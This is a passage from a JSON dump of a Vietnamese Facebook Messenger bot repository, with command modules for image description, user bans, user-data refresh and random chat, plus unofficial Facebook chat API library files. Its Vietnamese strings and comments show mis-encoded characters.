qu·∫£\n  for (const getImage of attachmentSend) {\n    try {\n      const getLink = await imgur.uploadFile(getImage);  // T·∫£i ·∫£nh l√™n imgur\n      const imgLink = getLink.link; \n      fs.unlinkSync(getImage);\n\n      // L·∫•y m√¥ t·∫£ t·ª´ API\n      const description = await getChatResponse(imgLink);\n      \n      // D·ªãch m√¥ t·∫£ sang ti·∫øng Vi·ªát\n      const translatedText = await translateToVietnamese(description);\n      \n      await api.sendMessage(translatedText, threadID, messageID);\n      Success++;\n    } catch (error) {\n      Error.push(getImage);\n      fs.unlinkSync(getImage);\n      api.sendMessage(`L·ªói khi x·ª≠ l√Ω ·∫£nh: ${error.message}`, threadID, messageID);\n    }\n  }\n};\n","path":null,"size_bytes":3665,"size_tokens":null},"modules/commands/setdatauser.js":{"content":"module.exports.config = {\n    name: \"setdatauser\",\n    version: \"1.0\",\n    hasPermssion: 2,\n    credits: \"D-Jukie\",\n    description: \"Set d·ªØ li·ªáu m·ªõi c·ªßa c√°c user v√†o data\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"\",\n    cooldowns: 5,\n};\n\n\nmodule.exports.run = async function ({ Users, event, args, api, Threads }) { \n    const { threadID, logMessageData } = event;\n    const { setData, getData } = Users;\n    var inbox = await api.getThreadList(100, null, ['INBOX']);\n    let list = [...inbox].filter(group => group.isSubscribed && group.isGroup);\n    for (var groupInfo of list) {\n        var { participantIDs } = await Threads.getInfo(groupInfo.threadID) || await api.getThreadInfo(groupInfo.threadID);\n        for (var id of participantIDs) {\n            let data = await api.getUserInfo(id);\n            data.name\n            let userName = data[id].name\n            await Users.setData(id, { name: userName, data: {} });\n            console.log(`ƒê√£ c·∫≠p nh·∫≠t d·ªØ li·ªáu c·ªßa ID: ${id}`)\n        }\n    }\n    console.log(`Update successful!`)\n    return api.sendMessage(`ƒê√£ c·∫≠p nh·∫≠t d·ªØ li·ªáu to√†n b·ªô user tr√™n h·ªá th·ªëng!`, threadID)\n}","path":null,"size_bytes":1180,"size_tokens":null},"lib/fca-auto/src/getUserInfoV4.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getUserInfoV4(id, callback) {\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n    \n        if (!callback) {\n            callback = function (err, userInfo) {\n            if (err) return rejectFunc(err);\n            resolveFunc(userInfo);\n            };\n        }\n\n        if (utils.getType(id) !== \"Array\") id = [id];\n\n    var form = {\n        av: ctx.userID,\n        fb_api_caller_class: \"RelayModern\",\n        fb_api_req_friendly_name: \"PresenceStatusProviderSubscription_ContactProfilesQuery\",\n        variables: JSON.stringify({\n            ids: id\n        }),\n        doc_id: 7188178894556645\n    };\n    console.log(form);\ntry {\n        defaultFuncs\n            .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then(function (resData) {\n            if (resData.error) throw resData;\n                callback(null,resData.data.viewer.chat_sidebar_contact_nodes[0]);\n            })\n            .catch(function (err) {\n                console.log(err);\n                log.error(\"getUserInfo\", \"L·ªói: getUserInfo C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu !,H√£y Th·ª≠ L·∫°i !\");\n                return callback(err);\n            });\n    }\n    catch (e) {\n        return callback(null, e);\n    }\n    return returnPromise;\n    };\n};","path":null,"size_bytes":1692,"size_tokens":null},"modules/commands/user.js":{"content":"module.exports.config = {\n  name: \"user\",\n  version: \"1.0.5\",\n  hasPermssion: 2,\n  credits: \"Mirai Team\",//Mod by H.Thanh\n  description: \"C·∫•m ho·∫∑c g·ª° c·∫•m ng∆∞·ªùi d√πng\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"< unban/ban/search + ID + text >\",\n  cooldowns: 5\n};\n\nmodule.exports.languages = {\n  \"vi\": {\n    \"reason\": \"L√≠ do\",\n    \"at\": \"V√†o l√∫c\",\n    \"allCommand\": \"to√†n b·ªô l·ªánh\",\n    \"commandList\": \"nh·ªØng l·ªánh\",\n    \"banSuccess\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu c·∫•m ng∆∞·ªùi d√πng: %1\",\n    \"unbanSuccess\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu g·ª° c·∫•m ng∆∞·ªùi d√πng %1\",\n    \"banCommandSuccess\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu c·∫•m l·ªánh ƒë·ªëi v·ªõi ng∆∞·ªùi d√πng: %1\",\n    \"unbanCommandSuccess\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu g·ª° c·∫•m %1 ƒë·ªëi v·ªõi ng∆∞·ªùi d√πng: %2\",\n    \"errorReponse\": \"%1 Kh√¥ng th·ªÉ ho√†n t·∫•t c√¥ng vi·ªác b·∫°n y√™u c·∫ßu\",\n    \"IDNotFound\": \"%1 ID ng∆∞·ªùi d√πng b·∫°n nh·∫≠p kh√¥ng t·ªìn t·∫°i trong c∆° s·ªü d·ªØ li·ªáu\",\n    \"existBan\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí Ng∆∞·ªùi d√πng %1 ƒë√£ b·ªã ban t·ª´ tr∆∞·ªõc %2 %3\",\n    \"notExistBan\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí Ng∆∞·ªùi d√πng b·∫°n nh·∫≠p ch∆∞a t·ª´ng b·ªã c·∫•m s·ª≠ d·ª•ng Bot\",\n    \"missingCommandInput\": \"%1 Ph·∫ßn command c·∫ßn c·∫•m kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng\",\n    \"notExistBanCommand\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí Hi·ªán t·∫°i ID ng∆∞·ªùi d√πng b·∫°n nh·∫≠p ch∆∞a t·ª´ng b·ªã c·∫•m s·ª≠ d·ª•ng l·ªánh\",\n\n    \"returnBan\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu c·∫•m ng∆∞·ªùi d√πng:\\n- ID v√† t√™n ng∆∞·ªùi d√πng c·∫ßn c·∫•m: %1%2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnUnban\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu g·ª° c·∫•m ng∆∞·ªùi d√πng:\\n- ID v√† t√™n ng∆∞·ªùi d√πng c·∫ßn g·ª° c·∫•m: %1\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnBanCommand\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu c·∫•m s·ª≠ d·ª•ng l·ªánh ƒë·ªëi v·ªõi ng∆∞·ªùi d√πng:\\n - ID v√† t√™n ng∆∞·ªùi d√πng c·∫ßn c·∫•m: %1\\n- C√°c l·ªánh c·∫ßn c·∫•m: %2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnUnbanCommand\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu g·ª° c·∫•m s·ª≠ d·ª•ng l·ªánh ƒë·ªëi v·ªõi v·ªõi ng∆∞·ªùi d√πng:\\n - ID v√† t√™n ng∆∞·ªùi d√πng c·∫ßn g·ª° c·∫•m l·ªánh: %1\\n- C√°c l·ªánh c·∫ßn g·ª° c·∫•m: %2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n\n    \"returnResult\": \"ƒê√¢y l√† k·∫øt qu·∫£ ph√π h·ª£p:\\n%1\",\n    \"returnNull\": \"Kh√¥ng t√¨m th·∫•y k·∫øt qu·∫£ d·ª±a v√†o t√¨m ki·∫øm c·ªßa b·∫°n\",\n    \"returnList\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí Hi·ªán t·∫°i ƒëang c√≥ %1 ng∆∞·ªùi d√πng b·ªã ban, d∆∞·ªõi ƒë√¢y l√† %2 ng∆∞·ªùi d√πng\\n\\n%3\",\n    \"returnInfo\": \"[ ùó†ùó¢ùóóùóò ] ‚Üí ƒê√¢y l√† m·ªôt s·ªë th√¥ng tin v·ªÅ ng∆∞·ªùi d√πng b·∫°n c·∫ßn t√¨m:\\n- ID v√† t√™n c·ªßa ng∆∞·ªùi d√πng: %1\\n- C√≥ b·ªã ban: %2 %3 %4\\n- B·ªã ban l·ªánh: %5\"\n  },\n  \"en\": {\n    \"reason\": \"Reason\",\n    \"at\": \"At\",\n    \"allCommand\": \"All commands\",\n    \"commandList\": \"Commands\",\n    \"banSuccess\": \"[ Ban User ] Banned user: %1\",\n    \"unbanSuccess\": \"[ Unban User ] Unbanned user %1\",\n    \"banCommandSuccess\": \"[ banCommand User ] Banned command with user: %1\",\n    \"unbanCommandSuccess\": \"[ UnbanCommand User ] Unbanned command %1 with user: %2\",\n    \"errorReponse\": \"%1 Can't do what you request\",\n    \"IDNotFound\": \"%1 ID you import doesn't exist in database\",\n    \"existBan\": \"[ Ban User ] User %1 has been banned before %2 %3\",\n    \"notExistBan\": \"[ Unban User ] User hasn't been banned before\",\n    \"missingCommandInput\": \"%1 You have to import the command you want to ban!\",\n    \"notExistBanCommand\": \"[ UnbanCommand User ] User ID hasn't been banned before\",\n\n    \"returnBan\": \"[ Ban User ] You are requesting to ban user:\\n- User ID and name who you want to ban: %1%2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnUnban\": \"[ Unban User ] You are requesting to unban user:\\n- User ID and name who you want to ban: %1\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnBanCommand\": \"[ banCommand User ] You are requesting to ban command with user:\\n - User ID and name who you want to ban: %1\\n- Commands: %2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnUnbanCommand\": \"[ UnbanCommand User ] You are requesting to unban command with user:\\n - User ID and name: %1\\n- Commands: %2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n\n    \"returnResult\": \"This is your result: \\n\",\n    \"returnNull\": \"There is no result with your input!\",\n    \"returnList\": \"[ User List ]\\There are %1 banned user, here are %2 user\\n\\n%3\",\n    \"returnInfo\": \"[ Info User ] Here is some information about the user who you want to find:\\n- User ID and name: %1n- Banned?: %2 %3 %4\\n- Command banned?: %5\"\n  }\n}\n\nmodule.exports.handleReaction = async ({ event, api, Users, handleReaction, getText }) => {\n  if (parseInt(event.userID) !== parseInt(handleReaction.author)) return;\n  const moment = require(\"moment-timezone\");\n  const { threadID } = event;\n  const { messageID, type, targetID, reason, commandNeedBan, nameTarget } = handleReaction;\n\n  const time = moment.tz(\"Asia/Ho_Chi_minh\").format(\"DD/MM/YYYY HH:mm:ss\");\n  global.client.handleReaction.splice(global.client.handleReaction.findIndex(item => item.messageID == messageID), 1);\n\n  switch (type) {\n    case \"ban\": {\n      try {\n        let data = (await Users.getData(targetID)).data || {};\n        data.banned = true;\n        data.reason = reason || null;\n        data.dateAdded = time;\n        await Users.setData(targetID, { data });\n        global.data.userBanned.set(targetID, { reason: data.reason, dateAdded: data.dateAdded });\n        return api.sendMessage(getText(\"banSuccess\", `${targetID} - ${nameTarget}`), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch { return api.sendMessage(getText(\"errorReponse\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID) };\n    }\n\n    case \"unban\": {\n      try {\n        let data = (await Users.getData(targetID)).data || {};\n        data.banned = false;\n        data.reason = null;\n        data.dateAdded = null;\n        await Users.setData(targetID, { data });\n        global.data.userBanned.delete(targetID);\n        return api.sendMessage(getText(\"unbanSuccess\", `${targetID} - ${nameTarget}`), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch { return api.sendMessage(getText(\"errorReponse\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID) };\n    }\n\n    case \"banCommand\": {\n      try {\t\n        let data = (await Users.getData(targetID)).data || {};\n        data.commandBanned = [...data.commandBanned || [], ...commandNeedBan];\n        await Users.setData(targetID, { data });\n        global.data.commandBanned.set(targetID, data.commandBanned);\n        return api.sendMessage(getText(\"banCommandSuccess\", `${targetID} - ${nameTarget}`), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch (e) { return api.sendMessage(getText(\"errorReponse\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID) };\n    }\n\n    case \"unbanCommand\": {\n      try {\n        let data = (await Users.getData(targetID)).data || {};\n        data.commandBanned = [...data.commandBanned.filter(item => !commandNeedBan.includes(item))];\n        await Users.setData(targetID, { data });\n        global.data.commandBanned.set(targetID, data.commandBanned);\n        if(data.commandBanned.length == 0) global.data.commandBanned.delete(targetID)\n        return api.sendMessage(getText(\"unbanCommandSuccess\", ((data.commandBanned.length == 0) ? getText(\"allCommand\") : `${getText(\"commandList\")}: ${commandNeedBan.join(\", \")}`), `${targetID} - ${nameTarget}`), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch (e) { return api.sendMessage(getText(\"errorReponse\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID) };\n    }\n  }\n}\n\nmodule.exports.run = async ({ event, api, args, Users, getText }) => {\n  const { threadID, messageID } = event;\n  const type = args[0];\n  var targetID = String(args[1]);\n  var reason = (args.slice(2, args.length)).join(\" \") || null;\n\n  if (isNaN(targetID)) {\n    const mention = Object.keys(event.mentions);\n    args = args.join(\" \");\n    targetID = String(mention[0]);\n    reason = (args.slice(args.indexOf(event.mentions[mention[0]]) + (event.mentions[mention[0]] || \"\").length + 1, args.length)) || null;\n  }\n\n  switch (type) {\n    case \"ban\":\n    case \"-b\": {\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID, messageID);\n      if (global.data.userBanned.has(targetID)) {\n        const { reason, dateAdded } = global.data.userBanned.get(targetID) || {};\n        return api.sendMessage(getText(\"existBan\", targetID, ((reason) ? `${getText(\"reason\")}: \"${reason}\"` : \"\"), ((dateAdded) ? `${getText(\"at\")} ${dateAdded}` : \"\")), threadID, messageID);\n      }\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnBan\", `${targetID} - ${nameTarget}`, ((reason) ? `\\n- ${getText(\"reason\")}: ${reason}` : \"\")), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"ban\",\n          targetID,\n          reason,\n          nameTarget,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"unban\":\n    case \"-ub\": {\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID, messageID);\n      if (!global.data.userBanned.has(targetID)) return api.sendMessage(getText(\"notExistBan\"), threadID, messageID);\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnUnban\", `${targetID} - ${nameTarget}`), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"unban\",\n          targetID,\n          nameTarget,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n  case \"search\":\n    case \"-s\": {\n        var{userName}=global.data,txt='',count=0;\n        userName.forEach((v,k) => {\n           if(v.toLowerCase().includes(reason.replace(event.args[1],'').trim().toLowerCase())) txt+=`${++count}. ${v}\\nURL: https://www.facebook.com/profile.php?id=${k}\\n`;\n            });\n  /*\t\tconst contentJoin = reason || \"\";\n      const getUsers = (await Users.getAll(['userID', 'name'])).filter(item => !!item.name);\n      var matchUsers = [], a = '', b = 0;\n      getUsers.forEach(i => {\n        if (i.name.toLowerCase().includes(contentJoin.toLowerCase())) {\n          matchUsers.push({\n            name: i.name,\n            id: i.userID\n          });\n        }\n      });\n      matchUsers.forEach(i => a += `\\n${b += 1}. ${i.name} - ${i.id}`);*/\n    //\tif(!!txt)\n      api.sendMessage(getText(\"returnResult\", txt), threadID); //else api.sendMessage(getText(\"returnNull\"), threadID);\n    }\n        break;\n\n    case \"banCommand\":\n    case \"-bc\": {\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID, messageID);\n      if (reason == null || reason.length == 0) return api.sendMessage(getText(\"missingCommandInput\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID, messageID);\n      if (reason == \"all\") {\n        var allCommandName = [];\n        const commandValues = global.client.commands.keys();\n        for (const cmd of commandValues) allCommandName.push(cmd);\n        reason = allCommandName.join(\" \");\n      }\n      const commandNeedBan = reason.split(\" \");\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnBanCommand\", `${targetID} - ${nameTarget}`, ((commandNeedBan.length == global.client.commands.size) ? getText(\"allCommand\") : commandNeedBan.join(\", \"))), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"banCommand\",\n          targetID,\n          commandNeedBan,\n          nameTarget,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"unbanCommand\":\n    case \"-ubc\": {\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID, messageID);\n      if (!global.data.commandBanned.has(targetID)) return api.sendMessage(getText(\"notExistBanCommand\"), threadID, messageID);\n      if (reason == null || reason.length == 0) return api.sendMessage(getText(\"missingCommandInput\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID, messageID);\n      if (reason == \"all\") {\n        reason = (global.data.commandBanned.get(targetID)).join(\" \");\n      }\n      const commandNeedBan = reason.split(\" \");\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnUnbanCommand\", `${targetID} - ${nameTarget}`, ((commandNeedBan.length == global.data.commandBanned.get(targetID).length) ? getText(\"allCommand\") : commandNeedBan.join(\", \"))), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"unbanCommand\",\n          targetID,\n          commandNeedBan,\n          nameTarget,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\t\n      case \"info\":\n    case \"-i\": {\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ ùó†ùó¢ùóóùóò ] ‚Üí \"), threadID, messageID);\n      if (global.data.commandBanned.has(targetID)) { var commandBanned = global.data.commandBanned.get(targetID) || [] };\n      if (global.data.userBanned.has(targetID)) { var { reason, dateAdded } = global.data.userBanned.get(targetID) || {} };\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnInfo\", `${targetID} - ${nameTarget}`, ((!dateAdded) ? \"\" : \"\"), ((reason) ? `${getText(\"reason\")}: \"${reason}\"` : \"\"), ((dateAdded) ? `${getText(\"at\")}: ${dateAdded}` : \"\"), ((commandBanned) ? `${(commandBanned.length == global.client.commands.size) ? getText(\"allCommand\") : commandBanned.join(\", \")}` : \"\")), threadID, messageID);\n  }\n}\n      }","path":null,"size_bytes":14769,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getUserInfoV2.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getUserInfoV2(id, callback) {\n      var resolveFunc = function () { };\n      var rejectFunc = function () { };\n      var returnPromise = new Promise(function (resolve, reject) {\n        resolveFunc = resolve;\n        rejectFunc = reject;\n      });\n  \n      if (!callback) {\n        callback = function (err, userInfo) {\n          if (err) return rejectFunc(err);\n          resolveFunc(userInfo);\n        };\n      }\n    try {\n      var { getInfo } = require('../Extra/ExtraAddons');\n      getInfo(id,ctx.jar,ctx,defaultFuncs)\n        .then(data => {\n          //api.Horizon_Data([data], \"Users\", \"Post\");\n        return callback(null, data);\n      });\n    }\n    catch (e) {\n      return callback(null, e);\n    }\n    return returnPromise;\n    };\n  };","path":null,"size_bytes":873,"size_tokens":null},"modules/commands/chatngaunhien.js":{"content":"const randomChatRequests = {};  // L∆∞u tr·ªØ c√°c y√™u c·∫ßu chat ng·∫´u nhi√™n\nconst activeConnections = {};   // L∆∞u tr·ªØ c√°c k·∫øt n·ªëi ƒëang ho·∫°t ƒë·ªông\nconst connectionQueue = [];     // H√†ng ch·ªù c√°c y√™u c·∫ßu k·∫øt n·ªëi\nconst MAX_CONNECTIONS = 1;      // Gi·ªõi h·∫°n s·ªë l∆∞·ª£ng k·∫øt n·ªëi ho·∫°t ƒë·ªông\nconst CONNECTION_TIMEOUT = 5 * 60 * 1000; // Th·ªùi gian k·∫øt n·ªëi t·ªëi ƒëa (5 ph√∫t)\n\nmodule.exports.config = {\n  name: \"chatngaunhien\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"TatsuYTB\",\n  description: \"Chat ng·∫´u nhi√™n v·ªõi ng∆∞·ªùi kh√°c trong nh√≥m kh√°c\",\n  commandCategory: \"Nh√≥m\",\n  usages: \"chatngaunhien\",\n  cooldowns: 5\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n  const { threadID, senderID, messageID } = event;\n\n  if (args[0] === \"ketthuc\") {\n    if (!activeConnections[senderID]) {\n      return api.sendMessage(\"B·∫°n kh√¥ng c√≥ k·∫øt n·ªëi n√†o ƒëang ho·∫°t ƒë·ªông!\", threadID, messageID);\n    }\n    \n    endConnection(senderID, api, threadID);\n    return;\n  }\n\n  if (activeConnections[senderID]) {\n    return api.sendMessage(\"B·∫°n ƒëang c√≥ m·ªôt k·∫øt n·ªëi ƒëang ho·∫°t ƒë·ªông\\nVui l√≤ng k·∫øt th√∫c b·∫±ng c√°ch reply tin nh·∫Øn k·∫øt th√∫c v√†o tin nh·∫Øn chat ng·∫´u nhi√™n ho·∫∑c d√πng l·ªánh #chatngaunhien ketthuc ƒë·ªÉ k·∫øt th√∫c phi√™n tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu m·ªôt k·∫øt n·ªëi m·ªõi!\", threadID, messageID);\n  }\n\n  if (randomChatRequests[threadID] && randomChatRequests[threadID][senderID]) {\n    return api.sendMessage(\"B·∫°n ƒë√£ g·ª≠i y√™u c·∫ßu chat ng·∫´u nhi√™n tr∆∞·ªõc ƒë√≥, vui l√≤ng ƒë·ª£i!\", threadID, messageID);\n  }\n\n  // Ki·ªÉm tra xem ng∆∞·ªùi d√πng ƒë√£ g·ª≠i y√™u c·∫ßu ·ªü nh√≥m kh√°c ch∆∞a\n  for (const tid in randomChatRequests) {\n    if (tid !== threadID && randomChatRequests[tid][senderID]) {\n      return api.sendMessage(\"B·∫°n ƒë√£ g·ª≠i y√™u c·∫ßu chat ng·∫´u nhi√™n tr∆∞·ªõc ƒë√≥, vui l√≤ng ƒë·ª£i!\", threadID, messageID);\n    }\n  }\n\n  // Ki·ªÉm tra logic 1\n  if (Object.keys(randomChatRequests).length > 0 && Object.keys(activeConnections).length < MAX_CONNECTIONS) {\n    connectionQueue.push({ threadID, senderID, messageID });\n    return api.sendMessage(\"Nh√≥m c·ªßa b·∫°n hi·ªán ƒëang c√≥ y√™u c·∫ßu k·∫øt n·ªëi, b·∫°n s·∫Ω ƒë∆∞·ª£c th√™m v√†o h√†ng ch·ªù!\", threadID, messageID);\n  }\n\n  // Ki·ªÉm tra logic 2\n  if (Object.keys(activeConnections).length >= MAX_CONNECTIONS) {\n    connectionQueue.push({ threadID, senderID, messageID });\n    return api.sendMessage(\"Hi·ªán t·∫°i ƒëang c√≥ k·∫øt n·ªëi ho·∫°t ƒë·ªông. Y√™u c·∫ßu c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c th√™m v√†o h√†ng ch·ªù.\", threadID, messageID);\n  }\n\n  for (const tid in randomChatRequests) {\n    if (tid !== threadID) {\n      for (const uid in randomChatRequests[tid]) {\n        const otherRequest = randomChatRequests[tid][uid];\n        delete randomChatRequests[tid][uid];\n\n        if (Object.keys(randomChatRequests[tid]).length === 0) {\n          delete randomChatRequests[tid];\n        }\n\n        establishConnection(senderID, uid, threadID, tid, api);\n\n        clearTimeout(otherRequest.timeout);\n        return;\n      }\n    }\n  }\n\n  if (!randomChatRequests[threadID]) {\n    randomChatRequests[threadID] = {};\n  }\n\n  randomChatRequests[threadID][senderID] = {\n    timeout: setTimeout(() => {\n      delete randomChatRequests[threadID][senderID];\n      if (Object.keys(randomChatRequests[threadID]).length === 0) {\n        delete randomChatRequests[threadID];\n      }\n      api.sendMessage(\"ƒê√£ h·∫øt 10 ph√∫t. Kh√¥ng t√¨m th·∫•y ng∆∞·ªùi mu·ªën chat ng·∫´u nhi√™n!\", threadID);\n    }, 10 * 60 * 1000)\n  };\n\n  api.sendMessage(\"ƒê√£ g·ª≠i y√™u c·∫ßu chat ng·∫´u nhi√™n, vui l√≤ng ƒë·ª£i t√¨m ng∆∞·ªùi m·ªõi chat c√πng.\", threadID, messageID);\n};\n\nfunction establishConnection(user1, user2, threadID1, threadID2, api) {\n  activeConnections[user1] = user2;\n  activeConnections[user2] = user1;\n\n  api.sendMessage(\"B·∫°n ƒë√£ ƒë∆∞·ª£c k·∫øt n·ªëi v·ªõi ng∆∞·ªùi kh√°c. B√¢y gi·ªù h√£y b·∫Øt ƒë·∫ßu chat!\", threadID1);\n  api.sendMessage(\"B·∫°n ƒë√£ ƒë∆∞·ª£c k·∫øt n·ªëi v·ªõi ng∆∞·ªùi kh√°c. B√¢y gi·ªù h√£y b·∫Øt ƒë·∫ßu chat!\", threadID2);\n}\n\nfunction endConnection(userID, api, threadID) {\n  const partnerID = activeConnections[userID];\n\n  api.sendMessage(\"K·∫øt n·ªëi chat ng·∫´u nhi√™n c·ªßa b·∫°n ƒë√£ b·ªã k·∫øt th√∫c.\", threadID);\n\n  if (partnerID && activeConnections[partnerID]) {\n    api.sendMessage(\"Ng∆∞·ªùi d√πng kia ƒë√£ k·∫øt th√∫c chat ng·∫´u nhi√™n.\", activeConnections[partnerID]);\n    delete activeConnections[partnerID];\n  }\n\n  delete activeConnections[userID];\n}\n","path":null,"size_bytes":4572,"size_tokens":null},"lib/fca-auto/src/changeThreadColor.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeThreadColor(color, threadID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc(err);\n      };\n    }\n\n    var validatedColor = color !== null ? color.toLowerCase() : color; // API only accepts lowercase letters in hex string\n    var colorList = Object.keys(api.threadColors).map(function (name) {\n      return api.threadColors[name];\n    });\n    if (!colorList.includes(validatedColor)) throw { error: \"The color you are trying to use is not a valid thread color. Use api.threadColors to find acceptable values.\" };\n\n    var form = {\n      dpr: 1,\n      queries: JSON.stringify({\n        o0: {\n          //This doc_id is valid as of January 31, 2020\n          doc_id: \"1727493033983591\",\n          query_params: {\n            data: {\n              actor_id: ctx.userID,\n              client_mutation_id: \"0\",\n              source: \"SETTINGS\",\n              theme_id: validatedColor,\n              thread_id: threadID\n            }\n          }\n        }\n      })\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeThreadColor\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1863,"size_tokens":null},"lib/fca-auto/src/getUserInfoV5.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n\n  return function getUserInfoV5GraphQL(id, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n\n    // `queries` has to be a string. I couldn't tell from the dev console. This\n    // took me a really long time to figure out. I deserve a cookie for this.\n    var form = {\n      queries: JSON.stringify({\n        o0: {\n          // This doc_id is valid as of July 20th, 2020\n          doc_id: 